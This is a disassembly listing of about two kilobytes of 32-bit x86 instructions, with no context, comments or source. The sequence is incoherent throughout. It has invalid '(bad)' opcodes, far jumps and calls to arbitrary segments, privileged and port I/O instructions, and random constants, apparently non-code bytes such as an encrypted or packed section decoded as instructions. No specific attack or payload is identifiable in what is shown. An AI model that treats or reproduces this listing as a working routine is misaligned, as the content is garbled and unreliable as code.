  4039aa:	aas    
  4039ab:	js     0x4039fa
  4039ad:	jbe    0x403941
  4039af:	test   DWORD PTR [edi+0x69],ebp
  4039b2:	xor    ah,BYTE PTR [edi-0x50]
  4039b5:	loope  0x40399a
  4039b7:	lds    eax,FWORD PTR [esi]
  4039b9:	es xor al,0x54
  4039bc:	cmp    DWORD PTR [eax],edx
  4039be:	test   BYTE PTR [ebx+0x20447735],bh
  4039c4:	mov    ebp,0x3e0551e0
  4039c9:	jge    0x728f573e
  4039cf:	test   al,0xc5
  4039d1:	fwait
  4039d2:	shr    dh,1
  4039d4:	loopne 0x403a53
  4039d6:	mov    DWORD PTR [ebx-0x137fe67d],esi
  4039dc:	retf   0x56d4
  4039df:	mov    DWORD PTR [ebp-0x5449bd67],esp
  4039e5:	jo     0x4039c4
  4039e7:	inc    esp
  4039e8:	cli    
  4039e9:	cs mov al,0x5a
  4039ec:	test   BYTE PTR [edx-0x6e],dl
  4039ef:	pop    eax
  4039f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039f1:	cmp    edx,esi
  4039f3:	es jno 0x403a59
  4039f6:	ret    0x3fbc
  4039f9:	xchg   ebx,eax
  4039fa:	jmp    0x5892:0xbd80b309
  403a01:	lahf   
  403a02:	test   BYTE PTR [ebp+0x7bad5681],ah
  403a08:	jle    0x403a40
  403a0a:	clc    
  403a0b:	test   al,0x69
  403a0d:	je     0x403a20
  403a0f:	sbb    al,0x31
  403a11:	and    al,ch
  403a13:	mov    ah,0xa
  403a15:	(bad)  
  403a16:	dec    esp
  403a17:	push   edi
  403a18:	retf   0x2f4e
  403a1b:	lods   al,BYTE PTR ds:[esi]
  403a1c:	lahf   
  403a1d:	in     eax,0xb8
  403a1f:	leave  
  403a20:	scas   eax,DWORD PTR es:[edi]
  403a21:	push   es
  403a22:	pushf  
  403a23:	jns    0x403a90
  403a25:	fs push ebx
  403a27:	mov    WORD PTR [ecx-0x48],?
  403a2a:	fld    st(6)
  403a2c:	sub    bh,BYTE PTR [edi-0x55b239e5]
  403a32:	pop    ecx
  403a33:	xchg   DWORD PTR [edx+0x5f],edx
  403a36:	lock test BYTE PTR [edx],cl
  403a39:	ficomp WORD PTR [ecx-0x3f966e08]
  403a3f:	jmp    0x62a2:0xa8a2b9f
  403a46:	mov    BYTE PTR [ebx-0x7be2e157],0x74
  403a4d:	in     al,dx
  403a4e:	in     eax,0x84
  403a50:	loope  0x403aaf
  403a52:	js     0x403a85
  403a54:	inc    eax
  403a55:	ins    BYTE PTR es:[edi],dx
  403a56:	push   ds
  403a57:	gs or  esp,ebp
  403a5a:	pop    ebp
  403a5b:	imul   ebp,DWORD PTR [ecx],0x2978c859
  403a61:	mov    BYTE PTR [edi+eiz*8+0x2b],al
  403a65:	mov    ecx,0x64753930
  403a6a:	and    al,bl
  403a6c:	mov    BYTE PTR [ebx+0xa],cl
  403a6f:	xor    BYTE PTR [eax+0x35],al
  403a72:	or     DWORD PTR ds:0x8b32411b,0x32f4dac8
  403a7c:	xor    eax,0x4f855929
  403a81:	push   ebp
  403a82:	mov    ch,0x5
  403a84:	loop   0x403a21
  403a86:	adc    eax,DWORD PTR [ebp+0x4c336121]
  403a8c:	cli    
  403a8d:	push   ecx
  403a8e:	cmp    ebx,0xffffffa1
  403a91:	jle    0x403a1b
  403a93:	or     eax,0xf888d903
  403a98:	mov    edi,0xfb5ebf58
  403a9d:	inc    ebp
  403a9e:	ja     0x403aad
  403aa0:	cwde   
  403aa1:	psubusb mm6,QWORD PTR [edx-0x62]
  403aa5:	fisubr WORD PTR [esi-0x4f]
  403aa8:	fwait
  403aa9:	cmp    eax,DWORD PTR [ebx]
  403aab:	push   es
  403aac:	pusha  
  403aad:	jmp    0xdd48:0x6ca78ad1
  403ab4:	cmc    
  403ab5:	mov    ds:0x72d6b70,al
  403aba:	xor    BYTE PTR [eax+0x5b7fddd1],ch
  403ac0:	add    al,0x9
  403ac2:	lahf   
  403ac3:	lea    ebp,[edi-0x4c3a2454]
  403ac9:	arpl   WORD PTR [esi+0x9],bp
  403acc:	in     eax,dx
  403acd:	stc    
  403ace:	lods   eax,DWORD PTR ds:[esi]
  403acf:	jae    0x403b0a
  403ad1:	mov    bl,ah
  403ad3:	mov    esp,0x76e34ea2
  403ad8:	xor    ch,ch
  403ada:	lods   eax,DWORD PTR ds:[esi]
  403adb:	sbb    eax,0x9fc4f3d4
  403ae0:	shl    DWORD PTR [edx+0x3a],1
  403ae3:	xor    BYTE PTR [edx],dl
  403ae5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ae6:	jae    0x403ad6
  403ae8:	lds    esi,FWORD PTR [edi-0x3945a8e9]
  403aee:	push   0xffffffcf
  403af0:	lock add eax,0x1cb92a9c
  403af6:	dec    ecx
  403af7:	or     esi,DWORD PTR [edx+0x46]
  403afa:	pusha  
  403afb:	jmp    0x2f95934b
  403b00:	int3   
  403b01:	jo     0x403b35
  403b03:	sbb    edx,edi
  403b05:	pop    eax
  403b06:	out    dx,al
  403b07:	ror    esi,0xcd
  403b0a:	fistp  WORD PTR [ebp-0x29]
  403b0d:	stos   DWORD PTR es:[edi],eax
  403b0e:	add    ch,BYTE PTR [di-0x70]
  403b12:	jmp    0x9282:0xe98df322
  403b19:	icebp  
  403b1a:	pop    esi
  403b1b:	cmp    BYTE PTR [edi-0x40da9d9a],ch
  403b21:	test   ecx,ebp
  403b23:	rcr    al,cl
  403b25:	sub    al,0x97
  403b27:	inc    ebx
  403b28:	pop    ebx
  403b29:	jbe    0x403b58
  403b2b:	jmp    0x403aba
  403b2d:	or     eax,0x6a2aa131
  403b32:	dec    esi
  403b33:	add    DWORD PTR [ebx-0x59246fc4],0xffffff89
  403b3a:	adc    eax,0x8dce798b
  403b3f:	jecxz  0x403b05
  403b41:	call   0xf606:0x97562e1
  403b48:	clc    
  403b49:	push   ebx
  403b4a:	push   esp
  403b4b:	inc    edi
  403b4c:	jl     0x403b70
  403b4e:	push   ds
  403b4f:	sub    esi,edi
  403b51:	hlt    
  403b52:	inc    ecx
  403b53:	push   es
  403b54:	jmp    0xdeae:0x6b7cfa6d
  403b5b:	inc    ecx
  403b5c:	int    0x57
  403b5e:	sub    ecx,ecx
  403b60:	adc    eax,DWORD PTR [ebx+edi*1]
  403b63:	mov    esi,0xb447ee5e
  403b68:	mov    ebp,esp
  403b6a:	js     0x403b6a
  403b6c:	test   DWORD PTR [esi+0x53],0xabf673e6
  403b73:	ja     0x403bcd
  403b75:	pop    ebp
  403b76:	sbb    DWORD PTR ds:0x31faa71f,0xc
  403b7d:	sbb    eax,0x60f7fc8b
  403b82:	or     eax,0xe2133fac
  403b87:	dec    edi
  403b88:	inc    ebp
  403b89:	clc    
  403b8a:	and    al,0x5e
  403b8c:	dec    esp
  403b8d:	mov    ch,0x53
  403b8f:	shl    BYTE PTR [ecx+0x49],cl
  403b92:	add    al,dh
  403b94:	enter  0x4cde,0xf3
  403b98:	xchg   edi,eax
  403b99:	lahf   
  403b9a:	pop    ecx
  403b9b:	jp     0x403bd4
  403b9d:	or     DWORD PTR [edi+0x18c8b413],ebx
  403ba3:	dec    ecx
  403ba4:	scas   eax,DWORD PTR es:[edi]
  403ba5:	aam    0x8
  403ba7:	xchg   edx,eax
  403ba8:	and    DWORD PTR [ecx+ebx*2],ebp
  403bab:	or     edx,ecx
  403bad:	cmp    esi,edi
  403baf:	lds    eax,FWORD PTR [edx-0xb9bc3f]
  403bb5:	sbb    dh,dh
  403bb7:	leave  
  403bb8:	sar    DWORD PTR [esi],0x76
  403bbb:	int    0x9
  403bbd:	add    eax,0xfb34ba17
  403bc2:	jmp    0xd44d:0x1097beab
  403bc9:	cmp    eax,0x40b3b72a
  403bce:	xor    DWORD PTR [esi],edi
  403bd0:	div    BYTE PTR [edx+0x4155f346]
  403bd6:	(bad)  [edx]
  403bd8:	xor    al,0x48
  403bda:	mov    WORD PTR [ecx-0x57],cs
  403bdd:	ja     0x403b82
  403bdf:	shl    DWORD PTR [ecx],0x4
  403be2:	xchg   esp,eax
  403be3:	add    edx,DWORD PTR [edi+edx*8-0x24209bd1]
  403bea:	(bad)  
  403beb:	push   edx
  403bec:	and    edx,DWORD PTR [edx]
  403bee:	stc    
  403bef:	jle    0x403b90
  403bf1:	cld    
  403bf2:	inc    edi
  403bf3:	sar    BYTE PTR [ebx],cl
  403bf5:	xchg   edx,eax
  403bf6:	retf   0x6807
  403bf9:	mov    dh,0x4c
  403bfb:	jne    0x403c50
  403bfd:	jne    0x403c47
  403bff:	xchg   ebp,eax
  403c00:	cmp    al,0xb3
  403c02:	mov    bh,0xc9
  403c04:	mov    edi,0x7deb1231
  403c09:	imul   edx,DWORD PTR [ecx+0x2eb26fd8],0xffffff87
  403c10:	add    DWORD PTR [ecx-0x48],0xffffffee
  403c14:	dec    eax
  403c15:	mov    ds:0xd6fccbf1,eax
  403c1a:	inc    esi
  403c1b:	mov    BYTE PTR [ecx],al
  403c1d:	gs (bad) 
  403c20:	enter  0x135c,0x59
  403c24:	dec    edi
  403c25:	and    esi,DWORD PTR [esi+0x71fc1240]
  403c2b:	push   edx
  403c2c:	pop    es
  403c2d:	repnz adc eax,0xf1c64644
  403c33:	retf   0x28ab
  403c36:	xor    ebp,DWORD PTR [ebx]
  403c38:	mov    BYTE PTR [ecx+0x6b],ah
  403c3b:	push   ecx
  403c3c:	xchg   esi,eax
  403c3d:	or     al,0xb3
  403c3f:	shl    DWORD PTR [eax],1
  403c41:	xchg   BYTE PTR [edx-0x1],dl
  403c44:	cmp    ah,BYTE PTR [ecx]
  403c46:	rcl    BYTE PTR [ecx-0x35f37ec1],1
  403c4c:	gs repnz popf 
  403c4f:	iret   
  403c50:	pop    ebx
  403c51:	cld    
  403c52:	or     eax,0x82ad69ec
  403c57:	popa   
  403c58:	cdq    
  403c59:	inc    eax
  403c5a:	cmc    
  403c5b:	stc    
  403c5c:	imul   esi,eax,0xbcca19fd
  403c62:	dec    ebp
  403c63:	(bad)  
  403c64:	mov    ds:0x30117fd9,eax
  403c69:	cld    
  403c6a:	pop    ss
  403c6b:	fstp   QWORD PTR [ecx-0xe]
  403c6e:	add    bh,BYTE PTR [ebp+0x1e]
  403c71:	jle    0x403c89
  403c73:	les    ebp,FWORD PTR [eax+ebp*4-0x39]
  403c77:	idiv   DWORD PTR [ebx]
  403c79:	adc    esi,DWORD PTR [edx+ebx*1]
  403c7c:	inc    ebp
  403c7d:	push   edx
  403c7e:	scas   eax,DWORD PTR es:[edi]
  403c7f:	add    al,0xe3
  403c81:	and    edx,DWORD PTR gs:[eax+0x19]
  403c85:	pop    es
  403c86:	mov    esi,0x7b10aef3
  403c8b:	retf   0x6d7c
  403c8e:	mov    eax,ds:0x3596115a
  403c93:	adc    eax,0xf0296317
  403c98:	sbb    al,0xb1
  403c9a:	arpl   WORD PTR [edi],di
  403c9c:	or     BYTE PTR [ebp+0x1741a87a],ch
  403ca2:	ja     0x403cbd
  403ca4:	xchg   DWORD PTR [eax],esi
  403ca6:	ret    
  403ca7:	mov    BYTE PTR [eax*8-0xb9c1f40],al
  403cae:	mov    ecx,0xfd30ca00
  403cb3:	mov    ebx,0x54032c63
  403cb8:	dec    edi
  403cb9:	jg     0x403cbe
  403cbb:	aad    0x4
  403cbd:	mov    edx,0x739f8128
  403cc2:	cmp    al,0xc3
  403cc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cc5:	jge    0x403cdc
  403cc7:	mov    ds:0xcade11fc,al
  403ccc:	out    0xde,eax
  403cce:	jmp    0x403c9e
  403cd0:	dec    ebx
  403cd1:	pop    ss
  403cd2:	add    DWORD PTR [edi],ebx
  403cd4:	adc    dl,BYTE PTR [edx-0xb]
  403cd7:	scas   eax,DWORD PTR es:[edi]
  403cd8:	sbb    DWORD PTR [ecx-0xc50c23f],esi
  403cde:	(bad)  
  403cdf:	fs push esp
  403ce1:	sbb    ecx,0xffffff82
  403ce4:	and    DWORD PTR [edx-0x7ecf9cb5],0x7b
  403ceb:	pusha  
  403cec:	test   DWORD PTR [ebp+0x75935a99],eax
  403cf2:	pusha  
  403cf3:	das    
  403cf4:	mov    dh,0xe2
  403cf6:	shl    al,0xe7
  403cf9:	stos   BYTE PTR es:[edi],al
  403cfa:	mov    eax,0xc12a144d
  403cff:	mov    al,0x9a
  403d01:	jbe    0x403d82
  403d03:	mov    DWORD PTR [esi],esp
  403d05:	or     DWORD PTR [ebx],ecx
  403d07:	mov    esp,0xc31c7f1
  403d0c:	cmp    al,BYTE PTR [ebp+0x2e]
  403d0f:	or     esi,ebx
  403d11:	shl    BYTE PTR [ebx],0x4c
  403d14:	ret    
  403d15:	test   eax,0x6088e886
  403d1a:	ret    0x517f
  403d1d:	xor    dl,dl
  403d1f:	and    edx,eax
  403d21:	jmp    0x8701092d
  403d26:	shr    BYTE PTR [eax],1
  403d28:	pop    ebx
  403d29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d2a:	xor    edx,DWORD PTR [edx+0x35903874]
  403d30:	dec    edx
  403d31:	mov    edi,0x99de2cda
  403d36:	adc    al,0x24
  403d38:	test   eax,0xb146f44d
  403d3d:	mov    dl,0x97
  403d3f:	and    DWORD PTR [eax+edi*1-0x28194f96],edx
  403d46:	js     0x403d0d
  403d48:	cmp    ch,BYTE PTR [edx-0x37]
  403d4b:	fiadd  DWORD PTR [ecx]
  403d4d:	aad    0x81
  403d4f:	retf   
  403d50:	cmp    eax,0xb53c4008
  403d55:	pop    es
  403d56:	inc    ecx
  403d57:	pusha  
  403d58:	lahf   
  403d59:	(bad)  
  403d5b:	push   0x1febf10f
  403d60:	dec    ebp
  403d61:	lods   al,BYTE PTR ds:[esi]
  403d62:	xchg   ebp,eax
  403d63:	jo     0x403db5
  403d65:	add    al,0xbf
  403d67:	xor    DWORD PTR [eax],0xffffffbb
  403d6a:	stos   BYTE PTR es:[edi],al
  403d6b:	in     eax,0x1f
  403d6d:	sahf   
  403d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d6f:	int3   
  403d70:	jge    0x403d05
  403d72:	sar    DWORD PTR [ebx],0x91
  403d75:	pusha  
  403d76:	call   DWORD PTR [esi]
  403d78:	push   0xb
  403d7a:	add    edx,DWORD PTR [ebp+eax*1-0x3f]
  403d7e:	and    edx,DWORD PTR [esi+0x3b64d55]
  403d84:	sub    eax,0x5a8615c0
  403d89:	dec    ecx
  403d8a:	test   ch,ah
  403d8c:	adc    bh,BYTE PTR [edx]
  403d8e:	pop    edi
  403d8f:	loopne 0x403df5
  403d91:	leave  
  403d92:	inc    esp
  403d93:	(bad)  [ecx-0x7985b03f]
  403d99:	rcr    dl,1
  403d9b:	mov    ds:0x6432d047,al
  403da0:	jbe    0x403dd9
  403da2:	add    al,0x6
  403da4:	mov    ds:0x33ebc04f,al
  403da9:	rol    BYTE PTR [ecx+0x4229522d],0x0
  403db0:	scas   eax,DWORD PTR es:[edi]
  403db1:	add    DWORD PTR [eax],eax
  403db3:	add    BYTE PTR [ebx],cl
  403db5:	shl    edi,0x15
  403db8:	mov    dh,0x29
  403dba:	inc    edx
  403dbb:	add    cl,ch
  403dbd:	test   DWORD PTR ds:0x7a360000,eax
  403dc3:	daa    
  403dc4:	cmp    bl,BYTE PTR [ebx]
  403dc6:	sbb    ch,BYTE PTR [edx]
  403dc8:	pop    edx
  403dc9:	pop    es
  403dca:	scas   al,BYTE PTR es:[edi]
  403dcb:	and    ch,BYTE PTR [eax-0x35]
  403dce:	mov    BYTE PTR [eax+ebp*4+0x58],0xc5
  403dd3:	push   ss
  403dd4:	push   ss
  403dd5:	cmp    eax,0xe9161604
  403dda:	xchg   ebx,eax
  403ddb:	aaa    
  403ddc:	pop    ds
  403ddd:	shr    DWORD PTR [edi+0x3c],1
  403de0:	imul   ebp,ebp,0xe7c631ca
  403de6:	sbb    eax,0x750def66
  403deb:	xor    DWORD PTR cs:[ebp+0x62ea7c62],edx
  403df2:	push   esp
  403df3:	sub    edi,eax
  403df5:	push   ebx
  403df6:	xor    eax,0xafcb1845
  403dfb:	push   edi
  403dfc:	inc    ebp
  403dfd:	or     edi,DWORD PTR [edi+0x1753e38b]
  403e03:	popf   
  403e04:	imul   edx,DWORD PTR [ebp+0x246a012b],0xffffff82
  403e0b:	or     al,0xd8
  403e0d:	cmp    edi,DWORD PTR [ecx+0x49]
  403e10:	xchg   ebx,eax
  403e11:	dec    edi
  403e12:	fs and dl,ah
  403e15:	inc    esp
  403e16:	jno    0x403d9a
  403e18:	lea    ecx,[edi+0x2f63e612]
  403e1e:	fld    TBYTE PTR [ecx]
  403e20:	icebp  
  403e21:	adc    eax,0xccd945f3
  403e26:	mov    ah,0x53
  403e28:	aad    0x79
  403e2a:	adc    BYTE PTR [ebp-0x7b],bh
  403e2d:	rol    BYTE PTR [ecx+0x5e],1
  403e30:	mov    ah,BYTE PTR [ebp+esi*2+0x696e822c]
  403e37:	or     esp,DWORD PTR [eax+0x2f]
  403e3a:	cld    
  403e3b:	jge    0x403e9d
  403e3d:	ret    
  403e3e:	sbb    eax,0x9697b59e
  403e43:	xor    edi,eax
  403e45:	mov    dl,0x67
  403e47:	adc    eax,0x17699990
  403e4c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  403e4e:	sbb    bh,bh
  403e50:	or     BYTE PTR [ebx+0x7b],ah
  403e53:	test   al,0x91
  403e55:	jle    0x403dd9
  403e57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e58:	repz not DWORD PTR [ebp-0x11]
  403e5c:	jo     0x403eb0
  403e5e:	or     eax,0x65465bc4
  403e63:	fnstenv [esi-0x1]
  403e66:	mov    dl,0xc9
  403e68:	call   0x28e6:0xd15a6214
  403e6f:	ret    
  403e70:	sbb    edx,esi
  403e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e74:	pop    esi
  403e75:	push   0xffffffca
  403e77:	shl    BYTE PTR [esi+ebp*4-0x7c],cl
  403e7b:	in     al,dx
  403e7c:	jne    0x403e87
  403e7e:	mov    cl,0xa8
  403e80:	std    
  403e81:	scas   eax,DWORD PTR es:[edi]
  403e82:	test   eax,0x4fa50b52
  403e87:	adc    cl,BYTE PTR [eax]
  403e89:	out    dx,al
  403e8a:	sbb    BYTE PTR [esi],bh
  403e8c:	repz out 0x25,eax
  403e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e90:	xchg   esi,eax
  403e91:	repz int 0x58
  403e94:	add    al,0xb0
  403e97:	dec    ebp
  403e98:	repz sub BYTE PTR [ebp+ebx*4-0x722dd3b5],0x26
  403ea1:	adc    DWORD PTR [edx],edx
  403ea3:	aad    0xd0
  403ea5:	adc    esi,DWORD PTR [eax-0x8]
  403ea8:	mov    dh,0x60
  403eaa:	sbb    DWORD PTR [ebx+0x3d],0x7b
  403eae:	sbb    bh,BYTE PTR [edx]
  403eb0:	sub    BYTE PTR [edi+0x1969a163],ah
  403eb6:	loopne 0x403ee0
  403eb8:	xor    ebp,DWORD PTR [esi]
  403eba:	in     al,dx
  403ebb:	dec    ecx
  403ebc:	xchg   ebx,eax
  403ebd:	push   eax
  403ebe:	fstp   DWORD PTR ds:0xcda47341
  403ec4:	ins    DWORD PTR es:[edi],dx
  403ec5:	shl    ebp,cl
  403ec7:	lea    edx,ds:0x1170546c
  403ecd:	jp     0x403ea0
  403ecf:	aaa    
  403ed0:	push   0x48
  403ed2:	or     al,0xae
  403ed4:	outs   dx,BYTE PTR ds:[esi]
  403ed5:	jno    0x403e8a
  403ed7:	imul   esp,edi,0x6d121383
  403edd:	sahf   
  403ede:	ror    BYTE PTR [ecx+0x6a],cl
  403ee1:	jo     0x403ebd
  403ee3:	pop    ebp
  403ee4:	sub    dl,bl
  403ee6:	inc    ebp
  403ee7:	mov    esp,0x65e1d956
  403eec:	mov    bh,0xed
  403eee:	push   edi
  403eef:	popf   
  403ef0:	ja     0x403ee2
  403ef2:	cmp    ebp,esi
  403ef4:	mov    al,0xc8
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	fs pop ebx
  403ef9:	add    edi,esi
  403efb:	loopne 0x403ecd
  403efd:	retf   0x7f50
  403f00:	ss add al,0xb
  403f03:	jno    0x403f61
  403f05:	and    DWORD PTR fs:[esi],ebp
  403f08:	fadd   st(3),st
  403f0a:	iret   
  403f0b:	mov    ebx,0x1bb5d3e
  403f10:	lods   al,BYTE PTR ds:[esi]
  403f11:	and    ah,ah
  403f13:	mov    edx,0x37bb1eb2
  403f18:	inc    esp
  403f19:	or     eax,0x21be8e62
  403f1e:	mov    ss,WORD PTR [ecx-0xc]
  403f21:	fild   DWORD PTR [edi]
  403f23:	push   0xffffffca
  403f25:	aam    0xe9
  403f27:	dec    esi
  403f28:	shl    esi,1
  403f2a:	jle    0x403f57
  403f2c:	push   eax
  403f2d:	stc    
  403f2e:	sti    
  403f2f:	adc    edi,edx
  403f31:	mov    dl,0xa3
  403f33:	and    dl,BYTE PTR [ecx+ebp*1]
  403f36:	iret   
  403f37:	cmp    ebx,DWORD PTR [edx+eax*8]
  403f3a:	sbb    DWORD PTR [ebx],eax
  403f3c:	xlat   BYTE PTR ds:[ebx]
  403f3d:	and    ch,bl
  403f3f:	(bad)  
  403f40:	es jmp 0xfaa8:0xc80f
  403f47:	mov    ds:0xd0721e49,al
  403f4c:	lds    eax,FWORD PTR [ecx-0x71ff764]
  403f52:	dec    ebp
  403f53:	cmp    BYTE PTR [eax+0x1c],0xf6
  403f57:	push   ds
  403f58:	xchg   ebx,eax
  403f59:	mov    esi,0x6638bed4
  403f5e:	bound  ebp,QWORD PTR [ebx+ebp*1+0x2d]
  403f62:	cmp    ecx,DWORD PTR [esi-0x3]
  403f65:	pop    ebx
  403f66:	xor    DWORD PTR [ecx+0x66cb45e9],0x78b9ce12
  403f70:	int3   
  403f71:	test   al,0xa0
  403f73:	je     0x403f39
  403f75:	mov    dh,0xc6
  403f77:	fisubr WORD PTR [ecx]
  403f79:	test   al,0x52
  403f7b:	ret    0x8453
  403f7e:	cmp    bl,BYTE PTR [edi-0x4]
  403f81:	jns    0x403f38
  403f83:	xchg   edi,eax
  403f84:	mov    esp,0xd5740acb
  403f89:	sub    eax,DWORD PTR [ebx+ebx*1]
  403f8c:	sub    BYTE PTR [edx],0x88
  403f8f:	push   ecx
  403f90:	or     edx,DWORD PTR [edi-0x60]
  403f93:	nop
  403f94:	mov    cl,0xd
  403f96:	outs   dx,BYTE PTR ds:[esi]
  403f97:	add    eax,0x8ca89dd3
  403f9c:	mov    esi,0x93375d47
  403fa1:	nop
  403fa2:	cmp    ah,ah
  403fa4:	mov    eax,ds:0x10c6ee57
  403fa9:	or     DWORD PTR [ecx],edi
  403fab:	xor    edi,DWORD PTR [edx-0x30151bc3]
  403fb1:	lock mov al,ds:0x5c818957
  403fb7:	sub    ebx,esp
  403fb9:	mov    ecx,DWORD PTR [ebx]
  403fbb:	imul   esi,DWORD PTR [edx+ecx*2+0x1fc6db22],0xffffffec
  403fc3:	loopne 0x403fdb
  403fc5:	sub    BYTE PTR [eax],dl
  403fc7:	ficomp DWORD PTR [ecx]
  403fc9:	sti    
  403fca:	mov    edx,0x4f69b31c
  403fcf:	sub    al,0x2f
  403fd1:	das    
  403fd2:	push   0x4d
  403fd4:	push   esi
  403fd5:	cs je  0x403f95
  403fd8:	xor    DWORD PTR [ebp-0x6f16040e],ebp
  403fde:	sti    
  403fdf:	pop    eax
  403fe0:	stos   DWORD PTR es:[edi],eax
  403fe1:	inc    cx
  403fe3:	es jl  0x40401c
  403fe6:	popa   
  403fe7:	adc    ebp,ebp
  403fe9:	ss pop ebx
  403feb:	or     eax,0xd12dd984
  403ff0:	or     ebx,DWORD PTR [edi+ebp*2-0x2f]
  403ff4:	jne    0x404009
  403ff6:	adc    BYTE PTR [eax+0x326c015f],ah
  403ffc:	hlt    
  403ffd:	out    dx,al
  403ffe:	sub    edx,eax
  404000:	ins    BYTE PTR es:[edi],dx
  404001:	test   DWORD PTR [ebp-0x29],esi
  404004:	outs   dx,DWORD PTR ds:[esi]
  404005:	fs add al,0xb0
  404008:	or     DWORD PTR [eax+0x37],edx
  40400b:	les    ebp,FWORD PTR [esi+ebx*2-0x106be422]
  404012:	rcr    BYTE PTR [esi+ecx*4+0x6f8e5c70],cl
  404019:	push   es
  40401a:	sbb    eax,0xbd6040f3
  40401f:	and    edx,DWORD PTR cs:0x92ed3cb4
  404026:	or     eax,DWORD PTR [esi+0x1a350aab]
  40402c:	sbb    al,al
  40402e:	jno    0x404037
  404030:	cmp    eax,0xc9fad17b
  404035:	shl    BYTE PTR [edi],0xb
  404038:	fidivr WORD PTR [ebp+0x5b65d10f]
  40403e:	and    eax,0x8081a217
  404043:	aaa    
  404044:	jge    0x403fe7
  404046:	loop   0x403fd6
  404048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404049:	(bad)  
  40404b:	je     0x404041
  40404d:	idiv   DWORD PTR [edx]
  40404f:	data16 hlt 
  404051:	sahf   
  404052:	in     al,dx
  404053:	daa    
  404054:	cmp    BYTE PTR [eax],cl
  404056:	fisttp QWORD PTR ds:0x1a8bce1e
  40405c:	sub    DWORD PTR [edi-0x27d7d258],edx
  404062:	pop    esp
  404063:	mov    al,ds:0x75133fa2
  404068:	cld    
  404069:	aam    0x26
  40406b:	into   
  40406c:	ja     0x40408f
  40406e:	sub    DWORD PTR ds:0x7935b756,ebx
  404074:	mov    dh,0x78
  404076:	ds aas 
  404078:	rcr    ebp,1
  40407a:	rcr    dh,cl
  40407c:	xchg   DWORD PTR [ecx+eax*2],eax
  40407f:	test   BYTE PTR [edx+0x56e10431],bl
  404085:	retf   
  404086:	push   ecx
  404087:	xchg   esi,eax
  404088:	xor    edi,DWORD PTR [ecx+0x1d997514]
  40408e:	in     al,dx
  40408f:	mov    ds:0x21424604,al
  404094:	enter  0x3cc9,0xb6
  404098:	out    dx,al
  404099:	cwde   
  40409a:	xor    al,0xa7
  40409c:	cmp    ebp,edx
  40409e:	icebp  
  40409f:	mov    ebx,0x80a6baa9
  4040a4:	lahf   
  4040a5:	jns    0x4040b1
  4040a7:	cs push es
  4040a9:	sbb    ax,0x82b5
  4040ad:	jecxz  0x4040b1
  4040af:	cmp    al,BYTE PTR [ecx]
  4040b1:	inc    edi
  4040b2:	inc    edx
  4040b3:	test   eax,0x9f3417b9
  4040b8:	(bad)
  4040bb:	and    ebp,DWORD PTR [esi]
  4040bd:	xchg   ebp,eax
  4040be:	jno    0x404124
  4040c0:	movd   edx,mm6
  4040c3:	jp     0x404108
  4040c5:	lahf   
  4040c6:	or     BYTE PTR [ecx],0x1b
  4040c9:	sar    DWORD PTR [ebx],0xee
  4040cc:	jb     0x4040c3
  4040ce:	xor    dl,BYTE PTR [ecx]
  4040d0:	test   al,0x81
  4040d2:	adc    al,0xc8
  4040d4:	push   ebp
  4040d5:	push   edx
  4040d6:	cmp    DWORD PTR [edi],ecx
  4040d8:	xchg   edx,eax
  4040d9:	mov    edi,0x8cbdba97
  4040de:	jnp    0x404082
  4040e0:	sbb    BYTE PTR [ebx+0x44],ah
  4040e3:	cmp    al,0xc7
  4040e5:	sbb    esi,DWORD PTR ds:0x7ba851b7
  4040eb:	addr16 cdq 
  4040ed:	idiv   eax
  4040ef:	xchg   edi,eax
  4040f0:	inc    esp
  4040f1:	retf   
  4040f2:	icebp  
  4040f3:	ret    
  4040f4:	je     0x4040ff
  4040f6:	retf   
  4040f7:	out    dx,al
  4040f8:	add    eax,0x4f6b63ac
  4040fd:	clc    
  4040fe:	sbb    ebx,DWORD PTR [edi+edi*2-0x711f4673]
  404105:	cmp    edi,esi
  404107:	out    dx,al
  404108:	rcl    DWORD PTR [eax+0x9],1
  40410b:	push   ds
  40410c:	xor    dh,bl
  40410e:	adc    DWORD PTR [ebp+0x35],0x2f6f8347
  404115:	jle    0x4040c3
  404117:	repz cmp eax,0xd3b666b
  40411d:	mov    esp,0xc8f78cfe
  404122:	int3   
  404123:	pusha  
  404124:	rol    DWORD PTR [ecx+0xd],1
  404127:	(bad)  
  404128:	mov    ecx,0x20f47bfb
  40412d:	ret    0xfb6d
  404130:	loope  0x4040e1
  404132:	and    esi,DWORD PTR [ebx+eiz*8]
  404135:	ror    BYTE PTR [esi+0x341076e1],0x59
  40413c:	pushf  
  40413d:	inc    ecx
  40413e:	sub    esp,ebx
  404140:	jne    0x4040ff
  404142:	mov    eax,0xf5333df6
  404147:	jg     0x4041bf
  404149:	jle    0x40418b
  40414b:	inc    esi
  40414c:	mov    edx,0xee3f1586
  404151:	sub    eax,DWORD PTR [esi-0x75d14dd9]
  404157:	sub    eax,0xf84d9c37
  40415c:	jge    0x4041ad
  40415e:	add    edx,ebx
  404160:	jbe    0x4041a4
  404162:	adc    al,0x2d
  404164:	out    dx,eax
  404165:	dec    edi
  404166:	stc    
  404167:	pop    ds
  404168:	shl    ecx,0xf5
  40416b:	retf   
  40416c:	std    
  40416d:	xchg   ebx,eax
  40416e:	lds    ebx,FWORD PTR [edi+eax*2+0x300c8b89]
  404175:	sub    cl,BYTE PTR [edx]
  404177:	or     al,0xea
  404179:	push   esp
  40417a:	xor    BYTE PTR [edi+0x1b0a45ca],bh
  404180:	jl     0x4041fb
  404182:	add    eax,0xc20724cb
  404187:	or     ah,BYTE PTR [edi+eax*8]
  40418a:	mov    ds:0xc09ffe94,eax
  40418f:	ja     0x40418b
  404191:	cmp    eax,0x3a4dc08d
  404196:	mov    ebx,0x7e0ef1f8
  40419b:	lods   al,BYTE PTR ds:[esi]
  40419c:	pusha  
